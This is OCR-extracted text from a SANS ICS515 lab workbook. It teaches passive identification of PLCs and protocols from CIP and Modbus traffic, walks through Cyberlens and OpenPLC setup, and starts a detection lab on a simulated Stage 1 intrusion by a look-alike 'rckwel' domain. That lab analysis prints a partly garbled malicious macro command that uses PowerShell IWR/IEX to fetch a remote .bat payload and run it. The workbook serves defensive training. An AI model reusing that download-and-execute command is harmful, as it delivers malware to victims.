Device Type: P:cqrammable Logic Controller (@x008e)
~ Attribute: 3 (Product Code)
Product Code: 51
» Attribute: 4 (Revision)
Major Revision: 16
Minor Revision: 21
> Attribute: 5 (Status)
» Status: 0x3160
~ Attribute: 6 (Serial Number)
Serial Number: 4
+ Attribute: 7 (Prome oy

Product Name: 1756-155/A 1756-M12/A LOGIX5S55

*Answer* The device is a Rockwell Automation / Allen-Bradley (Make), 1756-L55/A and 1756-M12/A
LOGIX5555 (Model), with 0x0019c114 Serial Number. There are likely 2 1/O modules in this PLC (L55 and M12).
4. What type of safety function/system is 10.10.20.50 part of? Burner Management Safety System

*Note* Sometimes its as simple as analyzing the stream of communications to identify information about the
device.

> Filter for the PLC’s IP address
> Enter the filter ip.addr==10.10.20.50

> Follow TCP Streams to find something useful

> Right click the first packet in the session
> Follow > TCP Stream

© 2021, Robert M. Lee Lab 2.3-5
"Destination

Protocol Length Info.
a 66 $4741 — 448

3695 80. 900000

Mark/Unmark Packet Ctrl4M

3607 80.001608 -10. Ignore/Unignore Packet Ctrl+D 54 54741 + 448
| 3608 80.005754 ; P 82 Register Se
| 3609 80 087637 Set/Unset Time Reference Ctrl+T é Seen ierenise

3610 80.007818 Time Shift... Ctrl+shift+T jp 78 List Identi

3611 80.009800 Packet Comment... Ctrl+Alt+c Pp 129 List Identi

3612 80.010002 " err rman ———) OM 114 unconnected

3613 80.017643 109.10.20.50 WvedName — 444 Success: Id

3614 80.017940 19.10.19.20 | applyas Filter cM 146 Connection

3615 80.020693 1 20.50 . cM 98 Service not

3616 80.020992 10. .20 Prepare as Filter > cm 142 Connection

3617 86.030459 10.10. Conversation Filter +) CM 124 Success: Co

3618 8.030683 10.10.10> Colosize Coiwersation ‘ 112 Class (0x64

3619 80.034686 10.10.20. — 143 Success: Cl

Frame 3605: 66 bytes on wire (528

> —
» Ethernet II, Src: Dell_3c:53:0a ( TCP Stream Ctrl+Alt+Shift+T |
> : 7

>

Internet Penne Neloey 4 artes Copy ' DP stréam ctrl Sh ’ |

| Protocol Preferences »

-DP16Time. .db
. D.

. .DP12Timer..
-P12Time..dO...... an See eee err es Pilevel...F..<....S.D..

A_1ATimaNelaw Von a e DADunnina he an

*Answer* The device shows itself as part of the Burner Management Safety System

5. What are a few of the tags viewable in 10.10.20.50’s communications? TimerDelay, Level, Start, etc.
*Note* Continuing from the last question

*Note* We can review the TCP Stream and see a number of the tags in the traffic. Tags are representations of
the process data. As an example an HMI or Historian would have a tag for “Time” or “Temperature” or other
values important to the process and then show the actual data next to it. Sometimes tags can be seen in the
network traffic directly (but not always).

*Answer* TimeDelay, Timer, TimerDelay, Level, Start, and Running are all tags.

© 2021, Robert M. Lee Lab 2.3-6

*)

8 a 8 ss 8 a 2 ee SS ee
ww Ti aT ie oT ig a Te

Le’

as ty oY ws se se

6. How many words is the Request Path Size for TimerDelay with 10.10.20.50 as the Destination?
8

*Note* Request Path’s are the location on the device that store information and often are instructive of values
you can change on the controller with read/writes.

*Note* You have to be looking at the .50 IP address as the Destination

> Continuing from the last question review the Info of the communications until you see TimerDelay
values
> Select a TimerDelay packet
> Review the CIP data

He 22574 243.163374 10:.18.19.29 10:10, 20.50. CIP 129 ‘opgTimerDelay’ - Service (Ox4c)
+- 22575 243.168614 18.10.20.50 10.10.10.20 cIP 12i iccess: 'DP9TimerDelay' - Service
22576 243.169207 10.10.10.20 10.10.20.50 cIP "P1' - Service (x4c)

22577 243.174167 10.16.20.50 10.10.10.20 cIP 87 Success: 'P1' - Service (@x4c)
22578 243.174425 10.18.10.20 10.16.20.50 cIP 1160 'P10' - Service (6x4c)
22579 243.179743 10.10.20.50 10.10.10.20 cIP 107 Success: 'P10' - Service (@x4c)
22580 243.180072 10.16.10.20 10.10.20.58 cIP 114 'Pi@Level' - Service (@x4c)
| 22581 243.185256 16.10.20.58 10.10.10.20 cIP 110 Success: 'PiOLevel' - Service (@x4
| 22582 243.185590 10.10.10.20 10.10.20.50 cIP 111 'P1' - Service (@x4d)
| _22585 243.191236 10.10.20.50 10.10.10.26 ciP 104 Success: 'Pi' - Service (0x4d)

» Common Industrial Protocol
» Service: Unknown Service (@x4c) (Request)
eo = Request/Response: Request (x0)
.10@ 1100 = Service: Unknown (0x4c)
Request Path Size: 8 words
» Request Path: DP9TimerDelay
> Path Segment: @x91 (ANSI Extended Symbol Segment)
100. .... Path Segment Type: Data Segment (4)
...1 9901 = Data Segment Type: ANSI Extended Symbol Segment (17)
Data Size: 13 bytes
ANSI Symbol: DP9TimerDelay

wu

*Answer* 8

*Note* You could also get this answer quickly in tshark by using the following filter:
tshark -r normalops.pcap -Tfields -e cip.request_path_size
“((ip.addr==10.10.20.50) ) && (cip.symbol matches “TimerDelay”)” | sort | unig -c

Exercise Takeaways

Some, not all, ICS protocols have robust information in the protocol that is useful for asset identification
purposes. It is often surprising to people that you can routinely pull out make/model/serial/firmware and
more information from ICS protocols all passively by analyzing the traffic. Understanding the ICS protocols also
allow you to see what is being done to the controllers such as write/reads and what commands with what
values are being given to the controllers.

© 2021, Robert M. Lee Lab2.3-7
Dp DD DO aa

ow

» oe oO ww ww Ww Ww Ww

vo w

e Analyze the traffic and protocols of a running system
e Identify the assets of a running system

This lab will use the Windows VM, RELICS VM, and PLC Kit

1. Based on network traffic, how many PLCs are in the local segment?

2. Are there any system components communicating using unknown and/or possibly proprietary ICS
protocols?

Task — Investigating relationships between ICS application and network traffic.

*Note* To achieve the same results as shown in this workbook, ensure the system is running with the following
setup.

1. Stage the environment for the lab by ensuring your system is running with the following setup.

> The ClickPLC and I/O Board is assembled, configured and running.

> Open the CLICK Programming Software (Windows double click the desktop icon for the Click
software) and select connect to the ClickPLC. Select connect when the Click PLC is discovered
and select read project from the Click PLC option.

> Double click the HMI display shortcut on the Windows VM desktop to open the HMI and
navigate to the ‘Main’ display.

> If the communications on the HMI have timed out or stopped, restart the MatrikonOPC Server
for Modbus Devices service by double clicking on the Matrikon Service Restart desktop
shortcut

© 2021, Robert M. Lee Lab 2.4-1
1H Power Sytem HMI Main

fay ,

@)

eneration . ate Transmission
MW Output even i 4 Breaker Protection Relay
n Close 1 Open Close, |_ Fault Reset
S irae ve Fault
1
\ ' | 7s aan
tla
= a
Ca T
Generator — ann ie et
———516 | s3— ofo~
ai6 | at ovo
o t © fo
een ee. t=! (TRS SS SS
Load T
Min <> Max i”
oH | ft r
ix, ~ Reclosure
' Era Open Close
N as ' a *
1 \ 4 Load
e oa
‘ez 7 \ Power Meter (%) | Mine Max
1
a >
Fes im. ~ oi T
© 2021 SANS | ere} | | ——2-6.
Made in the USA 1 y we 4109)
industry ‘ [Distribution

‘Aleem tire ‘Achnowieage bre
Tit 0 FH ‘Trancmission Breaker Theped AN
Generation Area Critical farm
Local Generator NotAl iin For Bresiar Closed

lor Mott bin For Bresker Closed
rea Critical Alara

05 PM
a5 Pu

+ 7752021 82050 PH
+ 71510001 25229 PU

2. Open the RELICS VM and login

> Username: relics

> Password: relics
3. Ensure you can ping from RELICS to the Windows VM and the CLICK PLC

> Open a Terminal window and ping 192.168.0.8 (Windows VM) and 192.168.0.10 (CLICK PLC)
4. Launch the OpenPLC application configured on the RELICS VM

> Locate the OpenPLC icon in the bottom tray, and right click on it to “Start OpenPLC Services”

New Window

Start OpenPLC Services

oanoesegHh>, ® &® & & eo ®

Stop OpenPLC Services

Remove from Favorites

a, ® m@

> Go to the Windows VM and double click the OpenPLC Runtime desktop shortcut to connect to
the RELICS OpenPLC service you just started. Log in as Username: relics Password: relics

© 2021, Robert M. Lee Lab 2.4-2

a oanmn @®
cs’ <p’ is <p’ iy <p ia is ve ip

1s

“sp “5 is “5 is “Bs 4B) “s' “s 1s

“se

uw

te Dashboard

Programs
Slave Devices
Monitoring
Hardware
Users
Settings

Logout

Status: Stopped

Start PLC

Dashboard
Status: Stopped
Program: FuelValve
Description:

File: 756084.st

Runtime: N/A

Runtime Logs

OpenPLC Runtime is n

FuelValve

Select the “Start PLC” button
Wait a few seconds and then refresh the page or navigate to the </> Programs page and then back to
the Dashboard page. You should see the Status change to Running. We now have established
communications from a “softPLC” running on RELICS, to the HMI running on the Windows VM, and
communications from the Click PLC to the RELICS OpenPLC and the HMI.

Within RELICS, start-up Cyberlens.

VVVV

© 2021, Robert M. Lee

Right-click the Cyberlens icon from the dock panel at the bottom of the screen.
Choose ‘Start Services’
When asked in a new terminal window, enter ‘relics’ for the password.

Once the terminal window closes, left-click on the same Cyberlens icon to open the application.

New Window

Start Services

Stop Services

Remove from Favorites

Lab 2.4-3
8. Within Cyberlens if you are prompted -
> Enter username ‘relics’ and password ‘relics’.
> Check the box to ‘Agree to License Agreement’ and ‘Sign In’.

Username

relics

¥ Agree to License Agreement @

Sign in

9. Check server status.
> Open the ‘Server Console’ from the menu on the left.
> Ensure the server is running on listening port 1337.

Elapsed Time: 0d:0h:0m:15s |
tt Listening Port: 1337 |

© 2021, Robert M. Lee Lab 2.4-4

oe, @, @, @, @ @, @,

oe,

ce) @),
ae ww ww ww ww WW

we Ww

oe as aJ ws

10. Setup and run sensor.

> Open the ‘Sensor Console’ from the menu on the left.

> Under ‘Live Capture’, enter the following options displayed in the image below.

Interface options

ens33

Window size @
10

Server host

localhost

Server port @
1337

# Options

seconds +

> Start the sensor and ensure it is running as shown in the image below.

Elapsed Time: 0d:0h:0m:43s

© 2021, Robert M. Lee

Lab2.4-5
11. Capture some records.
> Watch the ‘Sensor Records’ for new entries.

‘Sensor Records
‘Sensor * Packets Bytes Window Size Timestamp |
b 149K 181 KB 16 seconds 2021 -07-0GT00:23:45.0002 |
1 148K t80Ke 10 secande 2n21-07-0870028'34 0002 |
1 137K 1eKB 10 seconds 2021-07-03T0023:12.0002 |

j Bytes Processed

> Leave the sensor running in the background to collect more data and move onto the next step.
> (Alternatively) Wait until 5 or more records have been reached before stopping the sensor.

*Note* The table and graph represents the number of packets processed. It should be around 1.47K packets
and 178-179 bytes. Also, if your window size was left at default, you will need to wait longer for the records to

° @

®

be displayed.

12. Review Dashboard

> Navigate to ‘Dashboard’ from the menu on the left.

> Review the information displayed but note the ‘Application Layer’ object.

Application Layer

© 2021, Robert M. Lee

de Web HTTP a.

Other

Modous
Lo

Lab 2.4-6

oe

= = ay ey

=

~

o
is is’ is <s is! is!

as

13. Review the network traffic topology and assets on the network.
> Navigate to ‘Interactive Map’ from the menu on the left.
> Load the capture by clicking ‘Start’ and them ‘Live/Offline Capture’.

Live/Offline eadbmis
Snapshots

Compare

Current Map

Clear Map

> The topology displayed will be similar to the images below but will vary depending on the traffic
present on the network. If only MAC addresses are displayed, then the behavioral based
analytic within Cyberlens was unable to associate a devices MAC address to its IP address.

i 00:0¢:29:7b:ad:74
00:40: 7¢:12:c7:05 inware
OEE. ‘

Unmapped Network
00:0¢:29:45:d3:86
Vmware

> Leave the sensor running, or restart it if stopped, to allow the MAC/IP association to succeed.

© 2021, Robert M. Lee Lab2.4-7
> Every few minutes refresh the topology by clicking ‘Start’ and them ‘Live/Offline Capture’ until
all, or at least some, of the IP addresses appear associated to the MAC address as shown in the
image below.

>» Navigate back to the Sensor Console by clicking the navigation button to the left of the Start
button in the top of the menu on the left. From the Sensor Console Stop the sensor.

fa

192.168.0. _
00:0¢:29:4:
Vmware 2.168,0.10
B0:70:12:¢7:05
KoyoElec

192.168.0.8
00:0¢:29°7b:ad:74
Vmware

*Note* When capturing packets from another remote network, the actual MAC address of the remote device
will not be present. Therefore, to see all private and public IP addresses that were captured from the network
click ‘Display’ and select both ‘Public/External Devices’ and Private/Internal Devices’. The ability to associate
the end points MAC address and IP address will help understand what communications exist within a network
segment and between network segments.

14. Review table of results.
> Navigate to ‘Data Viewer’ screen
> Multiple records should be displayed under ‘Data Tables’. Click on ‘First Seen Protocols’ to
open the associated table.

© 2021, Robert M. Lee Lab2.4-8
wy Ww

“Pp “sp ws as is mT is “B’

“Pp

Viewer > First Seen Protocols

First Seen Protocols

@ Fitters:
Show 10  v entries

Ethernet Addresses s

IP Addresses

192.168.0.9

192.168.0.10

192.168.0.8

192,168.08

192.168.0.9

192.168.0.8

192.168.0.10

Layer

application
application
application
application
application
application

application

> Select ‘Modbus’ in the filter under Protocol column.

> Three assets are communicating using Modbus, however, this table does not indicate which

device is the PLC.

Ethernet Addresses 4 IP Addresses
00:00:29:45:d3:86 192.168.0.9
00:0c:29:7b:ad:74 192.168.0.8
00:00:7¢:12:c7:05 192.168.0.10
Filter

> Go back to the list of ‘Data Tables’ under ‘Data Viewer’ and open the ‘Application Flow Records’

table.

> Download the table in EXCEL format and open in LibreOffice Calc by clicking on the link in the

upper right.

© 2021, Robert M. Lee

Filter

Layer

application

application

application

Filter

Protocol
Modbus
Modbus
Modbus
World Wide Web HTTP
World Wide Web HTTP
Unknown Protocol

Unknown Protocol

Protocol

Modbus.

Modbus

Modbus

Filter

Lab2.4-9
°

ning transport_records,xls x

You have chosen to open:
transport_records.xls

which is: application/xls type
from: http://localhost

What should Firefox do with this file?
C YBER @openwith LibreOffice Calc (default) v

Save File

Do this automatically For files like this From now on. |

Download: | csy | |
| Cancel OK N

> Within LibreOffice Calc, enable AutoFilter and click ‘Yes’ to using the first line as column header.

File Edit View Insert Format Styles Sheet Data Tools Window Help

-G@-H- Beg asg

|

j
|
|
|
|

19 |
Ai ~ fx E+ = srcip ‘o |
oe This documentis open in read-only mode. | AutoFilter h
More Filters »
Moe | ec Tl | : E |

(sictP_|Dst iP Protocol. Application | Define Range... prt

2 _/192.168.0.9 192.168.0.10 TCP __Modbus Select Range...

3 _|192.168.0.10 192.168.0.9 TCP Modbus _ Pai

> Utilize the first row as column headers
> Filter the ‘Src Port’ column to only show entries of 502.
>» Open the filter menu under ‘Src IP’ column and note the entry.

© 2021, Robert M. Lee Lab 2.4-10

“, we) ‘B) @, ee,

e)

(2) e hd)

.
Ow Ww Ww Ww WD W

Te

vn CA! Cs CS

Ua

ip

is’ ws is

ws

a ee
ont [e]ost Por [x]Total Pa
Sort Ascending

— Sort Ascending

Sort Descending =| Sort Descending

Top 10 ~~} Top 10
Empty i — Empty
Not Empty 7 Not empty

Standard Filter... 7 — Standard Filter...

[Search items... “| ISearch items

: je Sie) ea
|, (-] $0095, $4573, 59260 | mi
502 | |
~ | 50780 ie +
51365 | “|
|
|

| $1775 om —

_] $1793, 63420

_OK » Cancel OK | Cancel

lars TV ieMy id TOY TRH TW TG? TRA TH Trp

|
i
i

*Note* Only 1 entry is listed meaning that from the packets collected, the device at address 192.168.0.10 is
running a Modbus server. (You may see two IP addresses as an artifact of your system). As such, this is an
active PLC within the network traffic collected. Further investigation of network traffic based on system state
changes is necessary to confirm this is the only PLC present.

15. Return to the ‘Sensor Console’ in Cyberlens and restart the Live Captures.
16. Navigate back to the Windows VM and change to the Generation display.

> Ensure the ‘CT Fuel Valve Controls’ is in automatic and OpenPLC is selected as shown in the
image below.

© 2021, Robert M. Lee Lab 2.4-11
BE Power System HMI - Generation

Main

Transmision ; 718)2021
Generation Pept ti Residential Industrial Rai PM

CT Fuel Valve Controls Generation Interlock Status

19 3 @ OpenPic * @ Trans Breaker Closed

Local or Manual

© Manual Mode i | j O Intertie On
© Automatic Mode Breaker Permissives
© Local Click PLO y @ Generator Running

@ Trans. Protection Relay
@ Load Present

Inlet Air Steam Turbine
120

Combustion Turbine

@CT Running @AVROn Power

Expert Mode © /CT Stopped © Manual Mode On Consumption Generation Available
Sim 8 4
‘On = Use PB's Start Voltage Industnal 0 MW Mw Local

Off = Auto Start SES Regulation gemcd: MW Intertie

Residential 50 aw

Total uw mw Total

*  715/2021 8:20:50 PM 5 ‘Transmission Area Critical Alarm
+ 79572021 352.29PM © — 72021 14855AM Residential Area Crtical Alarm

Message
Transmission Breater Tipped
Generation Area Critical Alarm

Local Generator Notat Min For Breaker Closed
Local Generator Not t iin For Breaker Clased
Generation Area Critical Alarm

CT Fuel Valve Controls

© Manual Mode
@ Automatic Mode
© Local Click PLC

19 % Open @ OpenPLC

Local or Manual
OpenPLC Mode Mode
Control _ Control Setpoint

ClickPLC == Manual ~
a i

> With the Fuel Valve Controls now being operated by the remote Open PLC, test the PLC to PLC
operations by increasing or reducing load from the residential and industrial dials on the board.

> You should see an associated change in the percent valve open position in response to the fuel
demand changes as load goes up or down. We are now seeing more of a traditional system of
systems communications capture with multiple control devices on the network each handling a
specific part of the process and uniquely communicating to the HMI.

> Return to Cyberlens and leave the Sensor running.

> We will repeat the last step of exporting and review of the data in EXCEL. Go back to the list of
‘Data Tables’ under ‘Data Viewer’ and open the ‘Application Flow Records’ table.

> Download the table in EXCEL format and open in LibreOffice Calc by clicking on the link in the
upper right.

> Within LibreOffice Calc, enable AutoFilter and click ‘Yes’ to using the first line as column header.

> Filter the ‘Src Port’ column to only show entries of 502.

> Open the filter menu under ‘Src IP’ column and note the entry.

© 2021, Robert M. Lee Lab 2.4-12

@,

>
www

“> is “> ip! ip) is 4s! ts! is is! <s is

us

“s

ed

‘SSS a se at Se ea Re
Wisc ip [glos iP [e]Protocoi
3 Sort Ascending
Sort Descending

Top 10 -_
Empty
Not Empty

Standard Filter... a

Search items...

192.168.0.9

PPrePePrrer errr rPererrl

OK _ Cancel

TE? TRH OWT? TRH TH mp

of Pha

*Note* An ICS typically utilizes multiple embedded devices, such as PLCs and RTUs. How, and if, they appear
on the network will depend on 2 things. (1) Is the sensor collecting the right network segment to see the
traffic, and (2) is there active communication to the device. In this lab we determined that the end devices
hosting a Modbus service (port 502) were a PLC. We also determined that visibility of PLC communication is
based on what display was loaded on the HMI. This small example demonstrates how difficult it can be to
detect malicious ICS communications without false positives when measuring from a traffic baseline alone.

*Answer 1* There are 2 PLCs in the local network.

Task — ICS Protocol Analysis

*Note* Ensure you have your system and applications setup as directed in step one in the beginning of this
lab.

1. Identify end points communicating on unknown ICS protocol.
>» Within Cyberlens, open ‘First Seen Protocols’ table under ‘Data Viewer’
> Filter the ‘Protocol’ column to display only ‘Unknown Protocol’ entries.

© 2021, Robert M. Lee Lab 2.4-13
First Seen Protocols

© Fes Pretec: Unknow Pretec >

Show

Ethernet Addresses

00:00:29:7b:ad:74

00:40:76:12:07:05

Filter

*Note* It appears there are 2 end points communicating using an unknown protocol.
could just mean that Cyberlens does not have the

10 ~ entries

&

IP Addresses:

f€80:0000:0000:0000:7086:831 1 :ad82:6168

192.168.0.8
192.168.0.10

Filter

Layer
application
application
application

Filter

Search:
Protocol
Unknown Protocol
Unknown Protocol
Unknown Protocol
Filter
a

needed to determine what the protocol is, if it is an actual ICS protocol and how it relates to this ICS. If this
record does not exist, it is likely because the application is not setup as directed in step 1 in the beginning of

this lab.

2. Identify application of the unknown protocol.

> Within Cyberlens , open ‘Application Flow Records’ table under ‘Data Viewer’
> Filter the ‘Application ’ column to display only ‘Unknown Protocol’ entries.
> Filter the ‘Dst IP’ column to display only ‘192.168.0.10’ entries.

Application Flow Records

Show 10

Srcip

192,168.06

192,168.08

192,168.0.8

192. 168.08

192 168.08

192.168.0.8

192,168.08

192,168.08

192.168.0.8

192.168.0.8

Filter
Y

© 2021, Robert M. Lee

v entries

Det iP

192.168.0.10

192.168.0.10

192.168.0.10

192.168.0.10

192.168.0.10

192.168.0.10

192.168.0.10

192.168.0.10

192.168.0.10

192.168.0.10

Filter

Protocol

uoP

uoP

uop

upe

uoP

upP

upp

upP

upp

upe

Filter

Application

Unknown Protocol

Unknown Protocol

Unknown Protocol

‘Unknown Protocol

Unknown Protocol

Unknown Protocol

Unknown Protocol

Unknown Protocol

Unknown Protocol

Unknown Protocol

Fitter

Direction

Unknown

Unknown

Unknown

Unknown

Unknown

Unknown

‘Unknown

Unknown

Unknown

Unknown

Fitter

Src Port Dst Port
58301 25425
58301 25425
58301 25425
$8301 25425
58301 25425
58301 25425
58901 25425
58301 25425
58901 25425
58301 25425
Fitter Fiter
gl v
Lab 2.4-14

Unknown, in this case,
dissectors for this particular protocol. Further analysis is

~ o ~~ Fl] @) @®) ™) ™ @) @) @)

fe,

Aon ? o ° o,

(‘>
ws

ad

*Note* From what is shown, 192.168.0.8 and 192.168.0.10 are communicating using this unknown protocol.
Let’s assume the PLC (192.168.0.10) is the server side of this communication and note down the transport
layer protocol (UDP) and Source port number which may not match the image above.

> Ensure the Cyberlens Sensor is stopped.

> After you have stopped the sensor, close Cyberlens

> From within RELICS launch wireshark from the dock panel.
> Start a packet capture on interface ens33.

Capture

...using this filter: [i [Enter a capture filter...
dockerO ae

EN eee ee ee
veth5d3c69b Te
Loopback: lo AAU
any f

> With the capture running, apply the following filter
udp.port ==25425

> Stop the capture if packets are displayed. If no packets are displayed, it is likely because the
application is not setup as directed in step 1 in the beginning of this lab.

*Note* The results in Wireshark clearly indicate that there is no dissector for this protocol in Wireshark. Make
note of the other communications port in use in the filtered conversation occurring with port 25425

2. Identify process and vendor communicating over this protocol.
> From within the Windows VM. Run PowerShell as Administrator.
> Execute the following command . Replacing ‘YourPortNumberHere’ in the command with the
Source port you identified earlier.

Get-Process -Id (Get-NetUDPEndpoint -LocalPort YourPortNumberHere).OwningProcess | Select-Object Path

*Note* The protocol is related to the AutomationDirect ClickPLC programming software.

*Answer 2* End point 192.168.0.8 and 192.168.0.10 are communicating over an unknown ICS protocol. It is
not certain, but probable that this is a proprietary protocol.

© 2021, Robert M. Lee Lab 2.4-15
Exercise Takeaways

The purpose of this exercise was to add another operational component to the ICS515 Student Lab
environment. This was accomplished by starting RELICS and launching the OpenPLC application which acts as
a soft PLC in the environment providing status and controls to the fuel supply valve position of the Generator.
This allows us to see more of a system of systems view of the Student Kit process.

With these additional communications and the existing communications to and from the student kit to the
HMI, we could see information on the devices, protocols being used, monitoring live traffic, and performed
some asset / ICS protocal analysis of unknown proprietary communications.

As you perform asset discovery within an OT environment, there may be unknown communications
discovered between devices and there could easily be devices that were not seen depending on the
operational state of the environment (normal operations with primary / secondary standby devices, abnormal
operations after asset failovers or device failures, and emergency operations after an operations impacting
event). These various operational states could easily impact which assets are communicating within the
environment and what communications look like at any given time.

© 2021, Robert M. Lee Lab 2.4-16

fm

-~

~~
wowewwwwew

wa Ww

eo wo w WwW

oT ee

oe we we se PH ow OW

Lab 3.1 — Detecting Stage 1 Intrusions

e Distinguish General Intrusions from Stage 1 Intrusions
e Leverage Traffic Analysis to Follow Intrusions
e — Identify Key Artifacts and Indicators from Intrusions

*Scenario Information* The Threat Intelligence Consumption team has noted that there is an emerging threat
targeting the industrial community. They are concerned that there might be a threat leveraging foreign
infrastructure to target industrial companies. They do not know anything else besides the increased interest at
this time. They are not even certain that the adversary is specifically interested in ICS. They’ve asked the threat
detection team to do a thorough analysis of the network traffic beyond the current detections to identify

anything abnormal. You, as a member of the threat detection team, decide to start in the Enterprise IT network
of Calistoga Refinery.

Exercise Prep

This exercise will utilize your RELICS VM and the itincident.pcap file in the ICS515 > calistogarefinery > pcaps
folder on the Desktop of the VM.

1. What is the Command and Control (C2) IP, its domain, and the victim system?
2. What is the name of the file that is likely malicious?

3. What common Windows utility is being abused in the document?

4. What is the IP address of the likely compromised system?

5.

What are two other likely malicious files that help show this as a Stage 1 intrusion?

© 2021, Robert M. Lee Lab 3.1-1
Task — Detection Rules

1. | What is the Command and Control (C2) IP, its domain, and the victim system?
192.41.148.220

__tckwel(dot)ru
10.10.0.10
> Start your RELICS VM
> Logintothe VM

> LOGIN=relics
> PASSWORD = relics

> Open itincident.pcap in Wireshark
> Open the ICS515 folder located on the Desktop and then navigate to calistogarefinery > pcaps
> Double click on itincident.pcap to open the file in Wireshark

fat Home Desktop 1CS515 calistogarefinery pcaps

- -
© Recent —
2193 itincident.pca Eee
* Starred = pee?
Cy Hone a normalops.pcap
a
(0 Desktop uN otincident.pcap
=) Documents

*Note* It is often useful to identify the “top talkers” on a network to see what addresses and systems are
communicating the most. Looking at the most communicative addresses, the largest transfer of data, or even
the longest duration of sessions is useful as is looking for the smallest. This is not always effective as modern
networks have a lot of communications that look very similar to exfiltration communications or command and
control, but it is a good starting point.

> Analyze the Conversations in Wireshark
> In Wireshark click Statistics
> Select Conversations
> Review the IPv4 communications

© 2021, Robert M. Lee Lab 3.1-2

~ °°, oe,

~~

~o ° =

°,
a ip <s wa ww o/

ws

as

ws

“5 OG

“5

a5

as

4g 40 @")®

| &|Apply a display filter ... <ctri-/>
|No. Time
1 0.600000

Source

File Edit View Go Capture Analyze Geo Telephony Wireless _Tools Help “i

Capture File Properties
Resolved Addresses
Protocol Hierarchy

Conversations

2 ©.002090 10.10.0.5gf Endpoints
3 0.004474 10.10.0409 packet Lengths
4 0.117871 10.10.0.50) monk

Ctrlsalt+shift+c

*Note* In the Conversations tab click the IPv4 tab and sort by Packets so that the largest number of packets

are at the top of the list.

192.41.148.220
10.10.10.20

2 1A tA 2A

227,708 65M 109,538
51,811 62M 44,805
AN e7O anna BY)

="

*Note* We see that IPv4 address 10.10.0.10 is communicating to 192.41.148.220 as the top communication
by both packets and bytes in the packet capture we have open. There are other interesting records, but we
are going to focus here and determine what the 192.41.148.220 IP address is to see if anything stands out
before we dig into the communications more deeply. It was not previously identified in the Visibility phase.

> Analyze the new IP Address

> Select the IP address, right click, and choose Apply as Filter > Selected > Any -> B

> Review the traffic

Ethernet-18 IPv4-17  IPv6  TCP-1582

| Address A Address B Packets Bytes
10.10.0.10 192.471.148.220 29,462
10.10.0.10 10.10.11 Apply as Filter rf
10.10.0.50  10.10.2, it: |
10.10.0.10 10.10.90, Prepare a Filter
10.10.0.40  10.10.2,  Find |
10.10.0.10  10.10.2) .

(10.10.0.30 10.102..Solorze

16

*Note* There are multiple ways to find information out about this IP address in the packet capture including
identifying all the protocols that it uses and identifying ones that might have identifying information. With the
previously applied filter though we see that there is TCP and HTTP traffic though. HTTP traffic is likely to give

us what we want including a domain name.

> Determine if there’s information in the HTTP sessions
> Click one of the HTTP communications

© 2021, Robert M. Lee

Lab 3.1-3
> Right click and Follow > TCP Stream

Destination

Seq=276 Ack=20458
Seq=276 Ack=27758 Win=48128
Seq=276 Ack=35058 Win=40704
Seq=276 Ack=42358 Win=33536
Seq=276 Ack=48198 Win=27648
Seq=276 Ack=96878 Win=15872

143 .810538 10.10.0.
143.810590 10.10.0.
143 .810642 10.10.

143.810696 10.10.60.
143.810901 10.10.60.
143 .811003 10.10.60.

|ACK]
Edit Resolved Name |
Apply as Filter

to)
ic}
Q
9
ic)
143.810484 10.10.0.10 192.41.
i}
ic}
to)
ic}
ic) Prepare as Filter
ic}

my
2
B
©
N
b
ray
parr arian are wre are are ers

Conversation Filter

-809158 3 2.41 Mark/Unmark Packet CctreM JACK] Seg=1 Ack=1 Win=65536 Len=0
143.809336  10.10.0.10 41 . doc HTTP/1.1
B 143.809942  10.10.0.10 141 Ignare/Unignore Packet etre ACK] Seq=276 Ack=18 Win=65536 Le
B 143.810338 10.10.0.10 192.41 Set/Unset Time Reference ctrl |ACK] Seq=276 Ack=7318 Win=65536
143.810431 10.10.0.10 192.41 Time Shift... CtrleshifteT [ACK] Seq=276 Ack=13158 Win=62720
CK] Seq=276 Ack=16078
Packet Comment... Ctrl+Alt+c

372: 66 bytes on wire (528 bits), 66 byte
et II, Src: Dell_3c:53:04 (f8:db:88:3c:53%Q

w

Colorize Conversation
SCTP

TCP Stream Ctrl+Alt+Shift+T

*Note* The ASCII representation of the TCP stream will appear and shows us what was taking place in depth.
It also shows us that the IP address’s domain name is rckwel.ru which appears to be a misspelled version of
Rockwell hosted on a Russian domain. These things alone don’t guarantee it’s malicious, but it is a safe
starting point that will hold true for us in this scenario.

Wireshark - Follow TCP Stream (tcp.stream eq 0) - itincident.pcap

GET /Resume.doc HTTP/1.1

Accept: text/html, application/xhtml+xml, us ai

Referer: http://rckwel.ru/

Accept-Language: en-US

User-Agent: Mozilla/5.@ (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
Accept-Encoding: gzip, deflate

Host: rckwel.ru

Connection: Keep-Alive

HTTP/1.0 200 OK

Server: SimpleHTTP/0.6 Python/2.7.18rc1
Date: Fri, 10 Jul 2020 21:35:16 GMT
Content-type: application/msword
Content-Length: 265728

Last-Modified: Fri, 10 Jul 2020 21:19:16 GMT

*Answer* The IP address is 192.41.148.220 and the domain is rckwel(dot)ru in communication with 10.10.0.10

2. What is the name of the file that is likely malicious? Resume.doc

*Note* With the Follow TCP Stream window still open from the last question we can see that there is alsoa
Resume.doc file that was transferred to the system in our network. This is suspicious in context but we will
want to know more before we say it is likely malicious. We could carve out the file and analyze it but
everything we need may also be here in the traffic.

© 2021, Robert M. Lee Lab 3.1-4

@) (@

)

‘> re e e ® (= ®) (=)

ie
ww a

‘5’

15 GS!

45

GET /Resume.doc
Accept: text/html,
Referer: http://rckwel.ru/
Accept-Language: en-US
User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
Accept-Encoding: gzip, deflate

Host: rckwel.ru

Connection: Keep-Alive

n/xhtml+xml, */*

HTTD/41 A PAA NK

3. What common Windows utility is being abused in the document? powershell

> Continue reviewing the TCP Stream
> Identify ASCII readable characters that can be observed easily

*Note* You will find interesting text towards the bottom of the window.

sie il ]...&. {9BA95972-F6A8-11CF -

Aaa2- QGAGC9OABF39} . x. cmd. exe. /e Honsohartre IWR -uri “https://
raw.githubusercontent . cany redébnaryoovatoalie red- team/master/ARTifacts/Chain. _Reactions/chain_reaction_DragonsTail.bat" -
OutFile epee beentea ay OAi: bat" ; ~\Document s\payload. bat... C:\Windows \System32. .

sito st BRR. Res y ive Peet Ree ere reer hr tos . PW Bi awe \rootesccs
\cimv2. .$.6. ..Startup.. +H. -@. .H.C.L + -winmgmts: sta
EB saaics te \root .Process. ‘$s. 6. ‘oma. exe ie "powershell. exe TEX. ( “IWR suri HU a di

